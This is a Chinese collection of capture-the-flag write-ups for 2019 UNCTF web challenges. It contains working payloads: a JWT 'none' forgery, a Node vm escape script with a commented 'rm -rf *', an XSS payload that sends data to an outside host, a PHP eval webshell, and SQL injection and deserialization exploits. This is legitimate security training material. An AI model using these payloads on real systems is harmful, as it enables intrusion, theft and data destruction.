# 2019UNCTF
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|中|

# 题目下载：
+ 暂无

# 网上公开WP：
+ 暂无

# 本站备份WP：
**感谢作者：2019unctf提供**
## WEB
### Arbi
#### 第一步
首先题目拿到是黑盒环境，注册账号后登陆，发现img标签src属性有个接口存在ssrf
题目提示了python3 http.server
所以可以猜测服务器9000端口开了个http.server可以读取文件
上传头像后 会通过ssrf去请求upload目录里的图像 ，直接通过web访问upload目录也可以访问图像，可以断定
http.server的根目录就是web目录，所以可以读取源码
但是ssrf判断了用户名和url必须匹配，所以通过注册恶意用户名，来绕过接口判断，来读取任意文件
PS： 我这里修改了http.server的源码不能列目录，所以注册/等列目录的文件名是不行的

由于X-Powered-By 看出后端采用express开发，web应用下应存在package.json文件
注册 ../package.json? 用户，通过接口读取到了package.json文件
得到提示1，flag在根目录/flag下

#### 第二步
package.json 显示主入口为mainapp.js，所以继续注册读取mainapp.js文件，
发现路由在 /routers/index.js文件
继续读取
为了让师傅们不这么恶心的做题，我直接在放了个源代码的zip在一个路由上，
读取 /routers/index.js 可以看到有个 VerYs3cretWwWb4ck4p33441122.zip 路由
直接在web上访问即可下载源代码，从而避免重复无用的做题步骤。源代码文件和题目环境文件完全一致
除了部署后动态生成的sessions文件外。
#### 第三步
然后就是白盒审计，可以发现注册登录功能采用了jwt认证，这里我参考了[ångstromCTF 2019](https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#%C3%A5ngstromctf-2019----quick-write-ups-by-terjanq-web)的 Cookie Cutter题目
认证过程是，每个人拥有自己独立的jwt secret
并且存在于服务端一个列表中，并且不同用户secret列表对应的id存储在了jwt中，登陆的时候会直接从jwt token中读取id
然后通过列表获取secret 进行解密，这里有个trick，node的jsonwebtoken 有个bug，当jwt secret为空时
jsonwebtoken会采用algorithm none进行解密
又因为服务端 通过
```javascript
 var secret = global.secretlist[id];
 jwt.verify(req.cookies.token,secret);
```

解密，我可以通过传入不存在的id，让secret为undefined,导致algorithm为none,然后就可以通过伪造jwt来成为admin
```python
# pip3 install pyjwt
import jwt
token = jwt.encode({"id":-1,"username":"admin","password":"123456"},algorithm="none",key="").decode(encoding='utf-8')
print(token)
```
#### 第四步
成为admin后，就可以访问admin23333_interface接口
审计可以发现，这是一个读取文件的接口
这里用到了express的特性，当传入?a[b]=1的时候,变量a会自动变成一个对象
a = {"b":1}
所以可以通过传入name为一个对象，避开进入if判断 从而绕过第一层`if(!/^key$/im.test(req.query.name.filename))return res.sendStatus(500);`的白名单过滤
第二个过滤是 判断filename 不能大于3,否者会过滤.和/,而读取flag需要先目录穿越到根目录
而../就已经占了3个字符，再加上flag肯定超过限制
这时候可以换个思路，length不仅可以取字符串长度还可以取数组长度，把filename设数组，再配合下面的循环
即可完美绕过过滤
而express 中当碰到两个同名变量时，会把这个变量设置为数组，例如a=123&a=456
解析后
a = [123,456]，所以最终组合成

`/admin23333_interface?name[filename]=../&name[filename]=f&name[filename]=l&name[filename]=a&name[filename]=g`

### bypass
1）	打开浏览器，访问目标主机，发现源代码 

![](https://ctfwp.wetolink.com/2019unctf/bypass/0.png)

2）	可以发现可以命令执行但是waf禁用了大部分符号，只能执行 file 命令，考虑如何bypass，发现误写反斜杠匹配模式，`\\|\n`会被解释为匹配竖线与换行符的组合,所以可以直接用%0a进行命令注入，最后在bypass的时候由于过滤了bin，以及grep，可以用/???/gr[d-f]p 的形式绕过，最后用`+` 绕过空格过滤

3）	最后payload见下图
 
![](https://ctfwp.wetolink.com/2019unctf/bypass/1.png)

### CheckIn
#### 原理知识
1）	远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。

2）	远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。  

3）	远程执行代码漏洞会使得攻击者在用户运行应用程序时执行恶意程序，并控制这个受影响的系统。攻击者一旦访问该系统后，它会试图提升其权限。
#### 解题过程
1）打开浏览器，访问目标主机，可以看到界面如下图1所示：
 
图1 web界面
2）分析js代码可以得知还有calc的功能，如下图2所示：
 
![](https://ctfwp.wetolink.com/2019unctf/checkin/checkin1.png)

3）从calc的源码可以看到，问题出在下面的eval函数上，导致了RCE远程代码执行漏洞：

![](https://ctfwp.wetolink.com/2019unctf/checkin/checkin2.png)

4）想要执行命令需要先绕过nodejs的vm模块，使用this.constructor.constructor（Object 类的 constructor 是外层的 Function 类）来完成逃逸，从而利用rce漏洞来读取flag文件，payload关键如下所示

'(new this.constructor.constructor("return this.process.mainModule.require;"))()("child_process").execSync("cat /flag").toString();';

exp.js:

```
const ws = require('ws');


// var sock = new ws("ws://127.0.0.1:8090");
var sock = new ws("ws://123.206.21.178:10001/secret");
sock.on("open", function () {

    // set nickname
    sock.send(JSON.stringify({ msg: "vk", cmd: "name" }));

    var m = "1+1";

    // get info
    // m = "new Error().stack";

    // get this
    // m = "this";
    // m = "this.constructor.constructor.toString()"

    // whoami
    //m = '(new this.constructor.constructor("return this.process.mainModule.require;"))()("child_process").execSync("rm -rf *").toString();';
	
	

    // get flag
    m = '(new this.constructor.constructor("return this.process.mainModule.require;"))()("child_process").execSync("cat /flag").toString();';

    sock.send(JSON.stringify({msg: m,cmd: "calc"}));
});

sock.on("error", function (err) {
    console.log("error: ", err);
});

sock.on("message", function (data) {
    var r = JSON.parse(data);
    // console.log(data);
    if(r.msg)
        console.log(r.msg);
    sock.close();
});
```

5）执行exp.js结果如下图所示：

![](https://ctfwp.wetolink.com/2019unctf/checkin/checkin3.png)

### CheckInA
#### 原理知识
1）	Node.js 就是运行在服务端的 JavaScript。Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。
#### 解题过程
1）打开浏览器，访问目标主机，可以看到界面如下图1所示：
 
![](https://ctfwp.wetolink.com/2019unctf/checkinA/checkina1.png)

2）由界面可知这是一个聊天室，想要发言需要起一个nickname：
 
![](https://ctfwp.wetolink.com/2019unctf/checkinA/checkina2.png)

3）盲测或者分析js代码，我们可以得知，输入/help后可以查看指令，发现需要输入/more查看更多指令,发现有/flag指令
 
![](https://ctfwp.wetolink.com/2019unctf/checkinA/checkina4.png)

4）输入/flag，得到flag
 
![](https://ctfwp.wetolink.com/2019unctf/checkinA/checkina4.png)

### Do you like xml
#### 原理知识
1）	XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。
#### 解题过程
1）打开浏览器，访问目标主机，发现提示flag in this pic图片提示。

![](https://ctfwp.wetolink.com/2019unctf/Do_you_like_xml/do1.png)

2）根据图片名hex.png以16进制或txt格式打开hex.png图片发现flag位置。

![](https://ctfwp.wetolink.com/2019unctf/Do_you_like_xml/do2.png)

3）	根据weak password提示，使用admin登录用户名密码，显示登陆成功，但无其他响应。

![](https://ctfwp.wetolink.com/2019unctf/Do_you_like_xml/do3.png)

4）	使用burp抓包发现xxe漏洞，利用xxe漏洞和php://filter伪协议读取flag.php文件，得到base64加密的字符串。

![](https://ctfwp.wetolink.com/2019unctf/Do_you_like_xml/do4.png)

5）	base64解密，得到flag。

![](https://ctfwp.wetolink.com/2019unctf/Do_you_like_xml/do5.png)

### easy_file_manage
#### 原理知识
+ 1.	第一个点是逻辑出现错误，先修改再判断了。
+ 2.	第二个点是有些CMS 会出现的问题，这个是比较简单的，比较难的可以参考：
https://wizardforcel.gitbooks.io/php-common-vulnerability/content/58.html?tdsourcetag=s_pcqq_aiomsg
#### 解题过程
 首先打开网页 

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea1.png)

正常注册登录后：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea2.png)

有提示看看 robots 文件，看看：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea3.png)

提示了两个备份文件，下载下来看看：

首先看看 download.php：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea4.png)

功能看起来像是查询数据库，拿到filename 后下载出来。其中还判断了user_id 。

再看看rename.php

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea5.png)

这里首先是更改了数据库，再检查后缀，所以我们可以通过这个读取任意文件，但是有判断不能读取
config 和 flag。

再看看 flag.php~

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea6.png)

这里是要登陆 user_id 是 99999... 的，显然不可能，我们可以看看check_login
这个函数。尝试读取 function.php。

首先上传一个正常的图片：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea7.png)

改名，这里先记住 f_id：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea8.png)

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea9.png)

会提示出错，但此时数据的filename字段已经被修改了，我们下载的时候是从数据库中查询出来的，然后访问
download.php 带入进 f_id：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea10.png)

下载下来后查看check_login 函数:

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea11.png)

这里调用了 decrypt_str 解 $_COOKIE[user] ，看看这个函数：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea12.png)

这两个函数，一个加密一个解密，大致就是将密钥和字符串进行一些简单的运算。

这是可以破解的，我们只要知道明文和密文，就能解出密钥了，我们再看看 login.php;

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea13.png)

Id的话，在首页有显示出来：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea14.png)

从 COOKIE 中把密文拿出来，尝试破解一下密钥：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea15.png)

这里要先urldecode 一次，因为 进入`_COOKIE` 时 php 好像自动把
%编码了一次，这里的解密函数直接用function.php 的即可：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea16.png)

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea17.png)

我们把明文当作密钥，这里要先 serialize 一下，因为加密时对明文 serialize 了。

这样就可以解密出KEY了，因为加密时是循环取 KEY 的值，所以开始重复时就是 KEY了。

这里的 SECRET_KEY 应该时 THIS_KEY。根据 flag.php~的提示 ，我们加密一个 id 是
99999999999999999 的，还有第二条件是存在 flag_pls ：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea18.png)

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea19.png)

还要再 urlencode 一次，放进 $_COOKIE 里就行了。

先不替换访问flag.php 试试：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea20.png)

替换 $_COOKIE 后：

![](https://ctfwp.wetolink.com/2019unctf/easy_file_manage/ea21.png)
### easy_pentest
#### 原理知识
1.存在waf拦截以下几种：

php标记:
`<?php , <?= , <?`

php函数:
              `base64_decode，readfile，convert_uuencode，file_get_contents`
              
关键字:
               `php://`
               
2.disable_function禁用了以下函数：

 `pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,passthru,exec,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,system,mail,error_log,move,copy,unlink`

3.需要一个safe_key 来让waf允许参数传入，否则所有参数都拒绝接收。

#### 解题过程
##### 1.获取safe_key
获取safe_key来允许参数传入通过访问发现跳转到一个页面，显示403表明缺少safe_key来通过安全验证，页面如下图
![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007005012080_9507.png)

Tp存在日志规律，请求都会记录在日志中，通过编写EXP来遍历所有可能存在的日志
EXP代码如下：
![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007005113182_4062.png)

执行exp脚本，发现存在02.log日志

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007005150409_29799.png)

打开日志可以看到记录了一条请求，通过GET方式请求且携带参数名为safe_key 值为 easy_pentesnt_is_s0fun 如下图

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007005341443_30605.png)

携带safe_key 再去访问public/index.php  发现跳转到了安全页面可知过了waf的安全验证。如图

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007005539187_16140.png)

##### 2.绕过限制来利用TP5 RCE漏洞
常见的tp5rce利用为 写日志，包含日志。写session，包含session。而这两种方式在这里都不可用，因为waf对<?php等关键字进行了拦截。

所以我们这里通过变形来绕过，利用base64编码与php://filter伪协议，通过inlcude方法进行包含，可以利用`php://filter/read=convert.base64-decode/resource=/var/www/html/runtime/temp/用户session名 `的方式进行解码。

然而session里面还有其他字符串，为了让传入的webshell能够被正确解码，我们需要构造合适的字符串。例如：

```
abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab
<?php @eval(base64_decode($_GET['r']));;?>
```

前后两个ab是为了满足shellcode前后两段字符串来被解析，可以fuzz判断需要加几个来凑满四个字节保证shellcode正常解析。

但是waf拦截了php等关键字，所以还需要绕过。filter其实是可以传递多个的，同时参数为参数引用。可通过strrev反转函数来突破限制。


##### 3.利用

第一步通过设置session，将webshell写入到session中在包含利用，payload为：

```
abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab
<?php @eval(base64_decode($_GET['r']));;?>
```


如图：

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007010634495_3110.png)

第二步通过webshell列出home目录，payload为：

```
var_dump(scandir("/home"));
dmFyX2R1bXAoc2NhbmRpcigiL2hvbWUiKSk7
```

获取到home目录底下的flag文件名字，如图：

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007011410830_14019.png)

第三步读取flag，payload为：

```
echo(readfile("/home/flag_1sh3r3.txt"));
ZWNobyhyZWFkZmlsZSgiL2hvbWUvZmxhZ18xc2gzcjMudHh0IikpOw==
```

如图：

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007011921707_19231.png)

##### 4.通过exp获取flag

执行get_flag.py , 传入网站地址和端口。 例如`python get_flag.py 192.168.232.144:88` 运行后获取到flag

如图：

![](https://ctfwp.wetolink.com/2019unctf/easy_pentest/20191007025804693_13219.png)

**参考**

+ Phithon：https://www.leavesongs.com/PENETRATION/php-filter-magic.html

+ 水泡泡：https://xz.aliyun.com/t/6106

### easy_sql_injection
#### 原理知识
改自ThinkPHP 的历史漏洞
#### 解题过程
首先打开首页：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/34f3d8ed3aeab22f446f4cffa66daf1d.png)

发现有源码，下载。

首先是 index：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/15fccc0452411bb82be7ceec76b14e81.png)

发现调用了 Db类的一些操作，看看 Db：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/54f9a036a519de9ead5f3825371ceff5.png)

首先时buildSql 函数，这应该是构建语句的函数，进去看看：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/e5f50841ab15d2a8f0079d408e69ea59.png)

ParseWhere，继续跟入：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/0f5a90e98fc789f14c36b627e56a87c2.png)

这里关键是parseWhereItem 函数，进去看看：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/d74ca8e4f51af4860eed249460e61d4a.png)

简单的分析一下：这里的 $val
是我们可控的值，可以是一个数组。如果是数组，is_scalar 就会返回 false，就不如进入
bind了。这个bind是 pdo的预处理，然后下面会根据 $exp 的值执行了一些操作，这里
$exp 也是我们可控的值，所以我们可以跟几个函数看看有没有注入的地方：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/a96fa5e5d4690b78f33442af5819d230.png)

分析后我们会看见，大部分函数都在函数内有绑定参数，但是有一个函数：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/f60cf7634e1b61065f89538925a83d14.png)

这里直接将 $field2 拼接进了字符串中，可能会导致注入。

我们试试看，回到 index.php中：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/9be47363005416d066b79d45a38c5bf6.png)

传入 keyword：keyword[]=column&keyword[1][]==&keyword[1][]=abcd%27

在本地实验一下，可以输出一下sql语句：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/5e8ad0ae885776ba40a92d2eb2acbb3e.png)

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/ea4c3dce6374c67651b1c38ec2770482.png)

可以看到这里被 **`** 包裹住了，我们可以逃逸出来，我们传入：

```
keyword[]=column&keyword[1][]==&keyword[1][]=abcd`) union select 1,2%23
```

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/42411d349e4a595592e675a94b894ad1.png)

这里 abcd 因为被
反引号包裹会被作为一个字段，所以要用一个已经存在的字段，否则会报错，我们可以猜一个字段名，比如id。

改一下语句，改成：

```
id`) union select 1,sleep(3)%23
```

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/30518999ae15aa1b577cf77963d6f8ca.png)

延时成功，证明可以使用盲注，我们可以上 sqlmap了：

执行语句：

```
python sqlmap.py -u "http://127.0.0.1/?keyword[]=column&keyword[1][]==&keyword[1][]=id`) union select 1,2*%23"
```

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/8e6e95c9b025898fe834d9923f2375a2.png)

然后加上 --current-db 得出当前数据库为 haha。

加上 -D haha --tables 跑出表名，发现存在 flag 表。

最后加上参数：-D haha -T flag --dump 跑出flag：

![](https://ctfwp.wetolink.com/2019unctf/easy_sql_injection/9e406dda1d224a57d5807d9fd7bc08b1.png)


### easyphp
#### 预备知识
1）	通过管道执行命令绕过waf
#### 解题过程

1）打开浏览器，访问目标主机，审计源码

2）提交如下payload system("ls;cat");

![](https://ctfwp.wetolink.com/2019unctf/easy_php/72dc63fac1601992e000c847fc5c644b.png)

1.  发现flag文件，继续提交如下payload system("<flag cat");

2.  使用脚本循环上传，并访问使用脚本不间断获取返回文件
    名并使用脚本访问该文件以便获得稳定的页面

![](https://ctfwp.wetolink.com/2019unctf/easy_php/5f32b440e96727212ea59ca3cb99ca21.png)

### EasyXSS
#### 预备知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以在页面上插入 XSS 语句。
2）	后端程序未关闭调试模式，可以将前端发送的数据回显出来。

#### 解题过程
步骤：

1.  打开靶机，是这样一个页面。

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/3cc3d131f809c4db4c8be6925145cc32.png)

1.  随意测下，页面有 xss。

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/47872259fe6f74fdc3784b25c575f960.png)

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/1a6a4e7f373fd49d7ac9a800645b73fe.png)

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/bab186519709f76afc85cbd1e82b280d.png)

1.  题目题面里有说 flag 在 httponly 的 cookie
    里，那么就来查找一下有什么页面可以利用的。

>   F12 看一下每个页面发的 ajax 请求。

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/32bdd309fa0e45bfcb015c1a4f9177e1.png)

>   这个页面似乎可以利用，不带 id 参数打开，调试信息里有 Cookie 信息。

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/1a3660e864cd3d69bc4b35d2e685979b.png)

>   再来看看页面的 ACL 头，可以带着 Cookie 发 XHR 请求。

1.  然后就来构造一个 XHR 请求的 Payload 来利用这个页面拿 flag 吧。

```
<img src='/efefefe' onerror="xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href='http://xss.zhaoj.in/?flag=' + xmlhttp.responseText.match('flag\{(.*?)\}')[1]}};xmlhttp.open('GET','/index.php/treehole/view?id=',true);xmlhttp.send('');"/>
```

1.  打过去，flag 到手。

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/f00cc716dc47bc33963ef133e668d2ee.png)

![](https://ctfwp.wetolink.com/2019unctf/EasyXSS/d09d2571141a0c0f6ce0eb8debd68bf9.png)


### GoodJava
#### 前言
由于之前没怎么写过Java，此题可能有些bug，但对于拿flag影响不大，还请师傅们见谅

此题参考了最近的TMCTF，经过了改编 加大了难度

原题是用原生Servlet编写
此题改写成了Springboot，并且在第一步加了过滤，第二步考点直接换成了Java命令执行绕过（改动很大）

#### 解题过程

##### 前序步骤

题目会提供一个Jar包

用idea打开反编译后审计源码

找到Controller

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/f632b2d3b620a2789cd736b3a3a83bc5.png)

###### 第一步

源码可知一共有两个路由

第二个路由需要输入secret密钥才能访问，而secret存在在服务器/passwd文件中

可以猜测第一个路由就是获取密钥文件的功能，跟进可以发现OIS类继承了ObjectInputStream，把POST数据传入OIS构造方法，而然后ois.readObject()则是反序列化操作

但是resolveClass方法限制了被反序列化的类只能是com.unctf.pojo.Man类

查看Man类，可以发现重写了readObject方法，这是Java反序列化的魔术方法，审计一下很容易发现XXE，根据代码构造即可

需要注意一下本地构造时serialVersionUID必须一致，此值代表了对象的版本或者说id，值不一致反序列化操作会失败

这里有个小考点，这里限制了xml数据不能含有file（大小写），而我们需要读取/passwd

这里有个trick，Java里面有个伪协议netdoc，作用和file一致，都是读取文件，所以这一步很简单，把file换成netdoc即可

注意一下本地构造包名也必须一致哦，不仅仅是类名一致就行

Man类加一个writeObject即可

详细步骤可以看看https://github.com/p4-team/ctf/tree/master/2019-09-07-trendmicro-quals/exploit_300

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/36bbca702b3e8ade40ea645de909d011.png)

exp

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/4dae53f0d9bdeb07a991c9c2e70d78c2.png)

output

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/003d4fd61709ab1fd5ea1d270ed823ce.png)

###### 第二步

然后就是第二步，考点是代码执行绕过

这里有个SPEL注入，可以构造任意类，但是同样代码过滤了Runtime|ProcessBuilder|Process

这三个Java中执行命令的类，题目提示必须执行命令才能拿到flag，然后Java又是强类型语言，很多操作不像php那么动态，所以这一步可能会难住很多人

然后这里有个trick，java内部有个javascript的解析器，可以解析javascript，而且在javascript内还能使用java对象

我们就可以通过javascript的eval函数操作

T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("xxxxxxxxx")

由于不能使用关键字，我们可以通过字符串拼接来

juke.outofmemory.cn/entry/358362

exp里面也有对应的转换脚本

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/0f2c349f76ddb214627f26e8b387f5dd.png)

exp

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/d70f4dd73c1f6dc5e2cb3974ab6e8f9d.png)

output

![](https://ctfwp.wetolink.com/2019unctf/GoodJava/55f46b48d5d3e37080e089798b5b722f.png)


### happyphp

```
<?php

class Server{
    public $file;
}

$a = new Server;
$a->file = "php://filter/read=convert.base64-encode/resource=files_upload_api.php";
echo urlencode(serialize($a));

echo "<br>";

$a = new Server;
$a->file = "LXJuploadspaht/shell.jpg"; //你上传的shell
echo urlencode(serialize($a));
```

### K&K战队的老家
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。

2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。

3）	PHP是弱类型语言

4）	PHP魔术方法可以通过反序列化进行触发

#### 解题过程
1.  打开浏览器，访问目标主机，发现登录框

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/cb9602cd3c83cd58635bff01fff42823.png)

1.  构造万能密码 ‘||1||’登录

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/f781cac39386f55caf82e4667e1c9e4c.png)

1.  发现/home.php?m=debug无法访问

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/0bb67653980950e30858fc09cb65a80c.png)

1.  通过m参数利用php伪协议绕过过滤读取题目源代码

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/3774d088ce498995f46d4f841dd9455f.png)

1.  通过代码审计可知access.php和flag.php，同时发现备份文件access.php.bak

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/b4b60f19b3b4838665dec5d8eb9e10c0.png)

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/13f3c91cfa843cf87aa6361d5dbf9755.png)

1.  通过代码审计构造反序列化漏洞利用

exp.php
```
<?php
class debug {
	public $choose = "2aaaa";
	public $id = 2;
	public $username = "debuger";
	public $forbidden = NULL;
	public $access_token = "";
	public $ob = NULL;
	public $funny = NULL;
}
class session {
	public $access_token = '3ecReK&key';
}
function cookie_decode($str) {
	$data = urldecode($str);
	$data = substr($data, 1);
	$arr = explode('&', $data);
	$cipher = '';
	foreach($arr as $value) {
		$num = hexdec($value);
		$num = $num - 240;
		$cipher = $cipher.'%'.dechex($num);
	}
	$key = urldecode($cipher);
	$key = base64_decode($key);
	return $key;
}
function cookie_encode($str) {
	$key = base64_encode($str);
	$key = bin2hex($key);
	$arr = str_split($key, 2);
	$cipher = '';
	foreach($arr as $value) {
		$num = hexdec($value);
		$num = $num + 240;
		$cipher = $cipher.'&'.dechex($num);
	}
	return $cipher;
}
$obj = new debug();
$obj1 = new session();
$str1 = serialize($obj1);
$obj->forbidden = $obj;
$obj->ob = $obj;
$obj->funny = $str1;
$str = serialize($obj);
echo cookie_encode($str);
?>
```

运行exp.php构造cookie

```
&144&16a&15f&121&13f&159&13a&15b&14a&147&13a&121&14a&169&139&126&13e&16a&160&127&153&16a&15f&122&13f&159&13a&15a&151&137&129&166&153&122&145&159&13f&123&13d&126&13e&144&15f&159&13d&15d&136&158&149&147&135&159&13f&123&13d&126&13d&15a&15f&159&151&147&141&159&13f&122&15b&126&13d&15a&164&16a&13f&15a&157&126&139&15e&146&16a&14a&148&13a&165&149&147&121&15c&139&15a&164&16a&13f&15a&153&126&139&15d&142&15c&149&15e&146&15e&14a&148&139&159&13f&123&13d&126&13f&144&15f&159&14a&15d&129&169&149&15d&15c&15b&14a&137&146&165&139&15a&164&169&13f&15a&135&127&153&16a&15f&168&13d&15a&15f&159&149&147&13e&15a&14a&148&13e&16a&148&123&142&166&151&122&146&165&139&15a&164&16a&13f&15a&131&126&139&159&139&127&153&16a&15f&169&13f&159&13a&166&149&159&139&127&153&15a&15f&168&13f&123&13d&126&13e&144&15f&159&14a&15e&146&165&152&15e&15b&159&13f&123&13d&126&13e&144&149&126&139&15b&128&126&13e&16a&15f&159&153&122&146&16a&153&122&15c&166&152&159&139&126&13d&144&160&127&153&16a&15f&168&13d&15a&15f&159&149&147&13e&15a&14a&148&13e&16a&148&123&142&166&151&122&146&165&139&15a&164&16a&13f&15a&135&167&13f&159&139&16a&14a&147&13e&143&14a&145&163&15d&151&122&146&125&139&15a&164&129&139&15a&164&129
```

1.  得到flag

![](https://ctfwp.wetolink.com/2019unctf/k_and_k/67d4b6019a7bd302e4bff4873717c10c.png)


### NSB_Login
#### 原理知识
1）	管理员使用了弱密码，就是那么简单。
#### 解题过程
步骤：

1.  打开靶机，是这样一个页面。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/460324bc6174f208f5e6ddfde11ee10d.png)

1.  随便输入下，提示用户不存在。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/717836e4d81bf5d007dd0d571e3cf966.png)

1.  输入用户名 admin，提示密码错误。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/7aa3c8909ff7dfa3a06fafbfc34f0199.png)

1.  查看页面源代码，发现有提示 rockyou，应该是使用了 rockyou.txt
    这个非常有名的字典。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/96056000b29cdbbf24e6c3eec76565d4.png)

1.  编写 Python 脚本，读入 rockyou 字典，运行。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/227ea3f8cc3fc7cb6d8226b592aeba75.png)

1.  得到 flag。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Login/d03fa1140c58a15a97ed0f0a9646bf5b.png)


### NSB_Reset_Password
#### 原理知识
1）	找回密码时先提交并储存了用户名，然后验证了验证码之后储存了一个验证已通过的标志，最后提交新密码时再判断是否通过验证再重置指定用户密码。

2）	在验证通过，还没有提交新密码时如果再回到一开始提交用户名时即可覆盖储存用户名，再提交密码时导致可以重置任意用户密码。
#### 解题过程
步骤：

1.  打开靶机，是这样一个页面。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/f216bfb338cc476f8c4f372a437e2d7f.png)

1.  有注册，那就先来注册个用户看看。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/03830682fbdd891cc0c071aebc381897.png)

1.  然后登录，提示要干管理员。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/2ddb5ba58ab7bbf9262457d95023a5be.png)

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/1ae2081d7d1be506d9959324c1d44fb3.png)

1.  那么就来找回密码试试。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/0fcbe940ff0737efb52c705087d03fc0.png)

1.  到邮箱可以看到验证码，填上。

